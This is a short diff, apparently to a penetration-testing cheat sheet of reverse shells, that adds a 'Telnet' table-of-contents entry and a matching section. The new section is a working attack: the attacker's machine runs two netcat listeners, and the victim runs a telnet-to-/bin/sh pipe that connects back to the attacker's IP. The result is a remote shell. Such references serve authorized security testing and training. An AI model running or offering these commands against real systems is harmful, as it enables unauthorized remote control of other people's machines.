@@ -28,6 +28,7 @@
     * [Python](#python)
     * [Ruby](#ruby)
     * [Socat](#socat)
+    * [Telnet](#telnet)
     * [War](#war)
 * [Meterpreter Shell](#meterpreter-shell)
     * [Windows Staged reverse TCP](#windows-staged-reverse-tcp)
@@ -246,6 +247,16 @@ Thread thread = new Thread(){
     }
 }
 thread.start();
+```
+
+### Telnet
+```bash
+In Attacker machine start two listeners:
+nc -lvp 8080
+nc -lvp 8081
+
+In Victime machine run below command:
+telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
 ```
 
 ### War
